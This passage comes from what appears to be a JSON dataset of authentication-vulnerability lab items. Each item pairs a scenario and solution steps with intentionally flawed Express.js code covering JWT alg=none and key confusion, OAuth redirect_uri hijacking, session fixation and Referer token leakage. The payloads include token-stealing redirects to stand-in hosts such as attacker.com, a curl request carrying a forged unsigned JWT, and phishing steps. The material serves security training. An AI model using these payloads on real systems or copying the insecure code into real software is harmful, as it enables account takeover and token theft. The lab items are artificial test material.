    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const jwksClient = require('jwks-rsa'); const app = express(); const client = jwksClient({ jwksUri: 'http://localhost:4001/.well-known/jwks.json' }); const getKey = (header, callback) => { client.getSigningKey(header.kid, (err, key) => { if (err) return callback(err); const signingKey = key.getPublicKey(); callback(null, signingKey); }); }; app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; jwt.verify(token, getKey, {}, (err, decoded) => { if (err || decoded.role !== 'admin') return res.status(403).send('Access Denied'); res.send('Welcome, admin!'); }); }); app.listen(4000, () => console.log('JWT Signature Confusion Lab running on http://localhost:4000'));",
    "payloads": [
      "{ \"alg\": \"RS256\", \"kid\": \"maliciousKey1\" }",
      "{ \"username\": \"carlos\", \"role\": \"admin\" }",
      "Signed token with RS256 using attacker's private key",
      "GET /admin with Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration via Open Redirect in Redirect URI",
    "Lab Description": "The application allows arbitrary redirect URIs after OAuth login. This misconfiguration can be abused to steal access tokens. To solve: capture a valid access token for the victim by injecting a malicious redirect_uri that sends the token to your server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using OWASP ZAP, intercept the OAuth flow and analyze the redirect_uri behavior.",
      "Test redirect_uri with an external domain (your controlled endpoint) to confirm open redirect is allowed.",
      "Construct an OAuth authorization URL with redirect_uri pointing to your malicious endpoint.",
      "Send phishing link containing the crafted URL to the victim to trick them into authenticating.",
      "Intercept the redirect and capture the access token sent in the URL fragment or query string."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const clients = [{ client_id: 'app123', redirect_uri: 'ANY' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; const client = clients.find(c => c.client_id === client_id); if (!client) return res.status(403).send('Invalid client'); const token = 'access-token-carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
    "payloads": [
      "http://localhost:4000/oauth/authorize?client_id=app123&redirect_uri=https://attacker.com/steal-token",
      "https://attacker.com/steal-token?access_token=access-token-carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation in REST API login flow",
    "Lab Description": "This lab's session management is vulnerable to session fixation through insecure handling of session cookies during login. The application sets a session cookie before authentication and reuses it post-login without regeneration. To solve: Fixate a session ID and force Carlos to authenticate using the attacker-defined session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, intercept a GET /login request and observe that a session cookie is set pre-authentication.",
      "2.Send the GET /login request to Burp Repeater and note the issued session ID.",
      "3.Force this session ID to be used by Carlos: trick him via CSRF or send a crafted link (simulate using /simulate-carlos-login endpoint with your cookie).",
      "4.Log in as Carlos using valid credentials (already known or via enumeration).",
      "5.Reuse the attacker-controlled session cookie to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'vulnerablesecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'supersecret' }]; app.get('/login', (req, res) => { res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = user.username; res.send('Welcome!'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') res.send('Account page of Carlos'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Reuse pre-login session cookie after Carlos authenticates",
      "Force victim to use attacker session ID: /simulate-carlos-login?cookie=sessionID",
      "Access /my-account with fixed session"
    ]
  },
  {
    "Lab scenario": "JWT tampering via alg=none in GraphQL authentication",
    "Lab Description": "The GraphQL login endpoint returns a JWT that is improperly validated. The server does not enforce signature verification when the alg field is set to 'none'. To solve: Modify a valid JWT to impersonate Carlos by removing the signature and setting alg to none.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Postman to log in as a regular user and capture the JWT from the Authorization header.",
      "2.Decode the JWT using jwt.io or Burp Decoder. Observe the HS256 alg and payload structure.",
      "3.Modify the header to {\"alg\":\"none\"} and the payload to {\"username\":\"carlos\"}. Remove the signature section.",
      "4.Send a request to the GraphQL endpoint using the tampered token: POST /graphql with Authorization: Bearer <modified_token>.",
      "5.Query the account details with: { me { username email } } and verify access as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtflaw' }]; const schema = buildSchema(` type Query { me: User } type User { username: String, email: String } `); const root = { me: (args, context) => { return { username: context.user.username, email: context.user.username + '@example.com' }; } }; app.use('/graphql', (req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (token) { try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; } else { req.user = jwt.verify(token, 'secret'); } } catch (e) { return res.status(403).send('Invalid token'); } } else { return res.status(401).send('Missing token'); } next(); }, graphqlHTTP((req) => ({ schema, rootValue: root, context: { user: req.user }, graphiql: true }))); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}",
      "Remove signature section of JWT",
      "POST /graphql with Authorization: Bearer <modified_token>",
      "{ me { username email } }"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in redirect URI validation",
    "Lab Description": "The application implements OAuth implicit flow but fails to strictly validate redirect URIs. An attacker can hijack tokens by manipulating the redirect URI to point to a domain they control. To solve: Capture the access token issued for Carlos by hijacking the redirect.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use OWASP ZAP to proxy the OAuth flow: initiate login and capture the authorization request to /authorize.",
      "2.Observe the redirect_uri parameter. Note that the app allows any subdomain of attacker-site.com.",
      "3.Craft a malicious redirect_uri like https://evil.attacker-site.com/callback and initiate the auth request with carlos logged in.",
      "4.Trigger the OAuth flow (simulate if needed via /simulate-oauth?user=carlos) and capture the redirected request on evil.attacker-site.com.",
      "5.Extract the access_token from the URI fragment and use it in Authorization header: GET /my-account with Bearer token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const oauthTokens = {}; const clients = [{ client_id: 'abc123', redirect_uri: 'https://*.attacker-site.com/callback' }]; const users = [{ username: 'carlos' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type, state } = req.query; const client = clients.find(c => c.client_id === client_id); if (!client || !redirect_uri.includes('.attacker-site.com')) return res.status(400).send('Invalid redirect URI'); const token = Buffer.from('carlos:' + Date.now()).toString('base64'); oauthTokens[token] = 'carlos'; res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (oauthTokens[token] === 'carlos') res.send('Carlos account accessed'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Hijack Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Redirect URI: https://evil.attacker-site.com/callback",
      "Access token from URI fragment: #access_token=...",
      "Authorization: Bearer <token>",
      "GET /my-account"
    ]
  },
  {
    "Lab scenario": "Session Fixation in SOAP API login flow",
    "Lab Description": "This lab demonstrates session fixation via SOAP-based authentication. The application reuses an existing session ID after login instead of generating a new one. This allows attackers to fix a session ID before victim login. The SOAP API accepts session tokens via HTTP headers, and the server provides overly verbose XML errors on failed authentication. To solve: fix a session ID, force the victim to authenticate into it, and access their profile page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to observe the SOAP login request: POST /soap-auth with SOAPAction header and XML body.",
      "2. Send an unauthenticated request to /profile. Capture the Set-Cookie header with JSESSIONID.",
      "3. Fixate the session ID by injecting the JSESSIONID into the victim\u00e2\u20ac\u2122s browser using a CSRF bait page or reflected XSS endpoint.",
      "4. After the victim logs in using the SOAP login endpoint, reuse the same JSESSIONID in your session.",
      "5. Access /profile with the fixed JSESSIONID. If you see the victim\u00e2\u20ac\u2122s account data, the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const soap = require('soap'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'soapSecret', resave: false, saveUninitialized: true })); app.use(bodyParser.text({ type: 'text/xml' })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/soap-auth', (req, res) => { const xml = req.body; const creds = parseSOAP(xml); const user = users.find(u => u.username === creds.username && u.password === creds.password); if (!user) return res.status(500).send(`<SOAP-ENV:Fault><faultstring>Invalid credentials for ${creds.username}</faultstring></SOAP-ENV:Fault>`); req.session.user = user.username; res.send(`<SOAP-ENV:Envelope><Body><status>Login successful</status></Body></SOAP-ENV:Envelope>`); }); app.get('/profile', (req, res) => { if (!req.session.user) return res.status(403).send('Unauthorized'); res.send(`Profile for ${req.session.user}`); }); function parseSOAP(xml) { const username = xml.match(/<username>(.*?)<\\/username>/)[1]; const password = xml.match(/<password>(.*?)<\\/password>/)[1]; return { username, password }; } const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation SOAP Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "<soapenv:Envelope><Body><username>carlos</username><password>pass123</password></Body></soapenv:Envelope>",
      "Cookie: JSESSIONID=FIXEDSESSIONID123",
      "XML Injection via malformed username fields (testing debug logs)"
    ]
  },
  {
    "Lab scenario": "JWT Authentication Bypass via 'none' algorithm in REST API",
    "Lab Description": "The lab uses JWTs for REST API authentication but does not properly verify the token signature algorithm. The server accepts tokens with 'alg':'none' and does not enforce a secret check. To solve: forge a JWT with 'none' algorithm to impersonate Carlos and access the /api/userinfo endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to log in and inspect the JWT token returned in Authorization: Bearer <token> format.",
      "2. Decode the JWT in jwt.io and analyze the header. Note that it uses HS256.",
      "3. Craft a JWT with header {'alg':'none'} and payload {'username':'carlos'} with no signature.",
      "4. Send a GET /api/userinfo request with Authorization: Bearer <forged-token>.",
      "5. If the response returns Carlos\u00e2\u20ac\u2122s user info, the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; const users = [{ username: 'carlos', password: 'carlospass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') return res.json({ user: decoded.payload.username }); try { const verified = jwt.verify(token, secret); res.json({ user: verified.username }); } catch { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "JWT: base64UrlEncode(header).base64UrlEncode(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth Code Interception in GraphQL Login Flow",
    "Lab Description": "The application implements login via OAuth in a GraphQL mutation using the authorization code grant. However, the client doesn't bind the authorization code to the session. An attacker can intercept the code and redeem it on their session to hijack the victim's login. To solve: intercept Carlos's OAuth code and redeem it via GraphQL to impersonate him.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use OWASP ZAP to proxy traffic and inspect the GraphQL mutation flow after initiating OAuth login.",
      "2. Observe the OAuth redirect URL leaking the authorization code in the query string.",
      "3. Simulate interception by copying Carlos\u00e2\u20ac\u2122s code parameter and replaying it in your own GraphQL login mutation.",
      "4. Send the GraphQL mutation loginWithOAuth(code: \"<intercepted>\")",
      "5. If your session is authenticated as Carlos, navigate to /me to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', oauth_id: 'oauth123' }]; app.use(bodyParser.json()); app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('loginWithOAuth')) { const code = query.match(/code: \\\"(.*?)\\\"/)[1]; const user = users.find(u => u.oauth_id === code); if (!user) return res.status(403).json({ error: 'Invalid code' }); const sessionId = 'sess_' + Math.random().toString(36).slice(2); sessions[sessionId] = user.username; res.json({ token: sessionId }); } }); app.get('/me', (req, res) => { const token = req.headers['authorization']; const username = sessions[token]; if (!username) return res.status(401).send('Unauthorized'); res.send(`Welcome ${username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth GraphQL Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "loginWithOAuth(code: \"oauth123\")",
      "Replay intercepted code in GraphQL mutation: { mutation { loginWithOAuth(code: \"oauth123\") } }",
      "Authorization: sess_<generated_session>"
    ]
  },
  {
    "Lab scenario": "Session fixation in SOAP login handler",
    "Lab Description": "The application's SOAP-based login mechanism does not regenerate session tokens after authentication. The application accepts externally provided session tokens via a JSESSIONID cookie. This allows an attacker to fixate a session ID for a victim prior to authentication. To solve: fixate a session and hijack Carlos's authenticated session using a shared SOAP login channel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy and observe the SOAP login endpoint and session cookies.",
      "Send an unauthenticated SOAP request to generate a session, and copy the issued JSESSIONID.",
      "Send a crafted phishing link to Carlos embedding the fixed JSESSIONID in a cookie.",
      "Once Carlos logs in, reuse the same session ID to access the authenticated state.",
      "Verify by navigating to /my-account and confirming access to Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const soap = require('soap'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'soapsecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carlos123' }]; app.post('/soap-login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.send(`<soap:Envelope><soap:Body><loginResponse>Success</loginResponse></soap:Body></soap:Envelope>`); } else { res.status(403).send(`<soap:Envelope><soap:Body><loginResponse>Failure</loginResponse></soap:Body></soap:Envelope>`); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account data for ${req.session.user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
    "payloads": [
      "Set-Cookie: JSESSIONID=attackerSession123;",
      "SOAP POST with <username>carlos</username> and <password>carlos123</password> using fixed JSESSIONID",
      "GET /my-account with Cookie: JSESSIONID=attackerSession123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm tampering in GraphQL login",
    "Lab Description": "The application uses JWTs signed with HS256 but accepts unsigned JWTs due to improper algorithm checks. The login mutation accepts a token returned in the login response and trusts it without re-verification. To solve: manipulate the JWT's alg claim and gain access to Carlos's protected GraphQL data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a GraphQL mutation and analyze the login response and token structure.",
      "Export the JWT and decode it. Modify the 'alg' header from HS256 to 'none'.",
      "Remove the signature and rebuild the token as a valid unsigned JWT.",
      "Replay the token in the Authorization header to access Carlos\u00e2\u20ac\u2122s profile query.",
      "Confirm success by querying for Carlos\u00e2\u20ac\u2122s email address using the modified token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const schema = require('./schema'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'secret', email: 'carlos@example.com' }]; app.post('/graphql', (req, res, next) => { if (req.body.query.includes('login')) { const { username, password } = req.body.variables; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ user: user.username }, 'supersecret', { algorithm: 'HS256' }); return res.json({ data: { login: token } }); } else return res.status(403).send('Invalid credentials'); } next(); }); app.use('/graphql', graphqlHTTP({ schema, graphiql: true })); app.listen(4000, () => console.log('JWT Tampering Lab running...'));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"user\": \"carlos\" }",
      "Final token: base64(header).base64(payload).",
      "Authorization: Bearer [unsigned JWT]",
      "GraphQL query: { profile { email } }"
    ]
  },
  {
    "Lab scenario": "OAuth access token leakage in Referer header",
    "Lab Description": "The application integrates OAuth for login and redirects the user to a third-party site after authentication. However, the OAuth access token is included in the redirect URL, which is then leaked via the Referer header. To solve: intercept the leaked token from the Referer header and access Carlos's account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth redirect after login and capture the Referer header sent to the third-party site.",
      "Note the presence of the access_token parameter in the Referer URL.",
      "Copy the leaked token and replay it in an Authorization header.",
      "Send GET /my-account with the Bearer token of Carlos.",
      "Confirm access to Carlos\u00e2\u20ac\u2122s account and capture email from response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const accessToken = req.query.access_token; res.redirect(`http://partner.com/landing?access_token=${accessToken}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-oauth-token') res.send('Account: carlos, Email: carlos@example.com'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running...'));",
    "payloads": [
      "Captured token: access_token=carlos-oauth-token",
      "Authorization: Bearer carlos-oauth-token",
      "GET /my-account with captured token"
    ]
  },
  {
    "Lab scenario": "OAuth access token leakage in Referer header",
    "Lab Description": "The application integrates OAuth for login and redirects the user to a third-party site after authentication. However, the OAuth access token is included in the redirect URL, which is then leaked via the Referer header. To solve: intercept the leaked token from the Referer header and access Carlos's account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth redirect after login and capture the Referer header sent to the third-party site.",
      "Note the presence of the access_token parameter in the Referer URL.",
      "Copy the leaked token and replay it in an Authorization header.",
      "Send GET /my-account with the Bearer token of Carlos.",
      "Confirm access to Carlos\u00e2\u20ac\u2122s account and capture email from response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const accessToken = req.query.access_token; res.redirect(`http://partner.com/landing?access_token=${accessToken}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-oauth-token') res.send('Account: carlos, Email: carlos@example.com'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running...'));",
    "payloads": [
      "Captured token: access_token=carlos-oauth-token",
      "Authorization: Bearer carlos-oauth-token",
      "GET /my-account with captured token"
    ]
  },
  {
    "Lab scenario": "Session Fixation via SOAP login flow in Session Management",
    "Lab Description": "The application processes login sessions through a SOAP-based authentication handler. It fails to regenerate session identifiers upon successful login. The server accepts session IDs via the JSESSIONID cookie and binds them to accounts without invalidation. To solve: fixate a session ID before login and use it to hijack Carlos\u00e2\u20ac\u2122s session post-authentication.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the initial unauthenticated SOAP request and extract the issued JSESSIONID.",
      "Send a crafted SOAP login request with Carlos\u00e2\u20ac\u2122s credentials using Postman while preserving the previously obtained JSESSIONID.",
      "Use Burp Suite to replay the request and confirm session fixation by observing that the same JSESSIONID is still active after authentication.",
      "Switch to browser and inject the fixed session ID into cookies while visiting /my-account.",
      "Confirm access to Carlos\u00e2\u20ac\u2122s account page using the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const soap = require('soap'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'soapsecret', resave: false, saveUninitialized: true })); app.use(bodyParser.text({ type: 'text/xml' })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/soap-login', (req, res) => { const xml = req.body; const match = xml.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Invalid request'); const [_, username, password] = match; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); req.session.user = user.username; console.log('[DEBUG] Session ID fixed:', req.sessionID); res.send(`<response><status>success</status></response>`); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running'));",
    "payloads": [
      "JSESSIONID=prelogin123",
      "<soapenv:Envelope><soapenv:Body><login><username>carlos</username><password>letmein</password></login></soapenv:Body></soapenv:Envelope>",
      "Cookie: JSESSIONID=prelogin123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in Authorization header in Bearer Token Authentication",
    "Lab Description": "The API accepts JWT tokens using the Authorization header. It trusts the 'alg' field in the token without verifying if a valid signature is provided. This flaw allows switching from HS256 to 'none' algorithm, effectively bypassing signature validation. To solve: forge a token granting admin access and retrieve Carlos\u00e2\u20ac\u2122s profile data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send an authenticated request and capture the original JWT from the Authorization header.",
      "Decode the JWT using jwt.io or Burp Decoder and observe the 'alg':'HS256' field.",
      "Create a forged JWT with 'alg':'none' and payload {\"user\":\"carlos\",\"role\":\"admin\"} using jwt.io or a Python script.",
      "Use Burp Suite to replace the Authorization header with the forged token and send it to /api/user/profile.",
      "Confirm unauthorized access by observing Carlos\u00e2\u20ac\u2122s data in the response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/api/user/profile', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'carlos' && payload.role === 'admin') return res.json({ profile: 'Carlos personal data' }); } return res.status(403).send('Unauthorized'); }); app.listen(4001, () => console.log('JWT Alg Confusion Lab running'));",
    "payloads": [
      "Authorization: Bearer <header: {\"alg\":\"none\"}, payload: {\"user\":\"carlos\",\"role\":\"admin\"}, signature: \"\" >",
      "curl -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.' http://localhost:4001/api/user/profile"
    ]
  },
  {
    "Lab scenario": "OAuth 2.0 token leakage in redirect_uri parameter via Authorization Code Flow",
    "Lab Description": "The app uses OAuth 2.0 Authorization Code flow for third-party authentication. It fails to validate exact matching of redirect_uri during code-to-token exchange, enabling token hijacking by supplying a malicious redirect URI on callback. To solve: steal Carlos\u00e2\u20ac\u2122s access token using an attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the /authorize?client_id flow and note the registered redirect_uri.",
      "Change the redirect_uri to a malicious but similar-looking domain (e.g., attacker.com instead of trusted.com) in the initial authorization request.",
      "After Carlos logs in, the authorization server redirects the code to your malicious domain with the token in the URL.",
      "Extract the leaked token from your attacker server log or browser.",
      "Use Postman to access /account/details with the stolen token as Bearer to retrieve Carlos\u00e2\u20ac\u2122s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; const clients = [{ id: '123', redirect_uri: 'https://trusted.com/callback' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const client = clients.find(c => c.id === client_id); if (!client) return res.status(400).send('Unknown client'); // Incorrect matching logic if (!redirect_uri.includes(client.redirect_uri)) return res.status(400).send('Redirect mismatch'); const code = 'authcode123'; tokens[code] = { user: 'carlos', scope: 'read' }; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.get('/oauth/token', (req, res) => { const { code } = req.query; if (tokens[code]) return res.json({ access_token: 'leaked-token-for-carlos' }); res.status(400).send('Invalid code'); }); app.get('/account/details', (req, res) => { if (req.headers.authorization === 'Bearer leaked-token-for-carlos') res.send('Carlos private account details'); else res.status(403).send('Unauthorized'); }); app.listen(4002, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "GET /oauth/authorize?client_id=123&redirect_uri=https://attacker.com/callback&state=abc",
      "GET /oauth/token?code=authcode123",
      "Authorization: Bearer leaked-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation in REST login flow",
    "Lab Description": "This application improperly handles session identifiers during the login process. A fixed session cookie provided before authentication is retained after successful login. The application binds authenticated sessions to pre-login identifiers, allowing attackers to force users to authenticate into attacker-controlled sessions. To solve: hijack Carlos's session and access his account dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, capture a GET /session request prior to logging in to observe the Set-Cookie header.",
      "2.Send the unauthenticated session ID to the victim via a crafted phishing page.",
      "3.Login to your own account and observe that your session ID changes upon successful login. Confirm mismatch.",
      "4.Use Burp to log in with the victim's credentials but force your controlled session ID via Burp's cookie editor.",
      "5.Access /dashboard using the fixed session and confirm access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; const users = [{ username: 'carlos', password: 's3cr3t' }]; app.get('/session', (req, res) => { const sid = 'sess-' + Math.random().toString(36).substring(2); sessions[sid] = null; res.cookie('sid', sid).send('Session created'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (!sid || !sessions[sid]) return res.status(400).send('Invalid session'); if (user) { sessions[sid] = username; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/dashboard', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username) res.send('Welcome to your dashboard, ' + username); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running at http://localhost:4000'));",
    "payloads": [
      "GET /session",
      "POST /login with Cookie: sid=sess-fixed",
      "Reuse sess-fixed after victim logs in",
      "GET /dashboard with forged session"
    ]
  },
  {
    "Lab scenario": "JWT None algorithm bypass in GraphQL login mutation",
    "Lab Description": "The GraphQL login mutation issues a JWT for session management but fails to enforce signature validation when the 'alg' header is set to 'none'. This misconfiguration allows an attacker to forge arbitrary tokens without knowing the secret key. To solve: forge a JWT for Carlos and access the /graphql me query.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Postman to send a login mutation and observe the signed JWT in the response.",
      "2.Decode the JWT and note the algorithm used in the header.",
      "3.Modify the header to 'alg': 'none' and create a payload with 'username': 'carlos'.",
      "4.Base64-encode the modified header and payload, concatenate with two dots, and remove the signature.",
      "5.Use Burp to send a POST /graphql query with the forged Authorization: Bearer token and verify the response from the 'me' query."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; const schema = require('graphql').buildSchema(` type Query { me: String } type Mutation { login(username: String!, password: String!): String } `); const root = { login: ({ username, password }) => { const user = users.find(u => u.username === username && u.password === password); if (!user) throw new Error('Invalid credentials'); return jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); }, me: (args, context) => { const token = context.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') return decoded.payload.username; try { const verified = jwt.verify(token, 'supersecret'); return verified.username; } catch (e) { return 'Unauthorized'; } } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, context: req, graphiql: true }))); app.listen(4000, () => console.log('JWT None Bypass Lab running at http://localhost:4000'));",
    "payloads": [
      "Header: { \"alg\": \"none\" }",
      "Payload: { \"username\": \"carlos\" }",
      "JWT: base64(header).base64(payload).",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect",
    "Lab Description": "The OAuth flow implemented in the app allows open redirect on the 'redirect_uri' parameter during authorization, enabling attackers to capture tokens issued for other users. To solve: intercept the authorization code for Carlos by crafting a redirect to an attacker-controlled domain, then exchange it for a token and access Carlos's profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Initiate an OAuth login from the app and observe the authorization URL including the 'redirect_uri' parameter.",
      "2.Replace the 'redirect_uri' with your controlled domain (e.g., https://attacker.com/capture).",
      "3.Send the crafted link to Carlos. Upon clicking, Carlos's auth code will be sent to your domain.",
      "4.Exchange the stolen code for a token using the token endpoint.",
      "5.Use Postman to send a GET /profile request with Authorization: Bearer <access_token> and confirm it returns Carlos's data."
    ],
    "Vulnerability name": "Authentication",
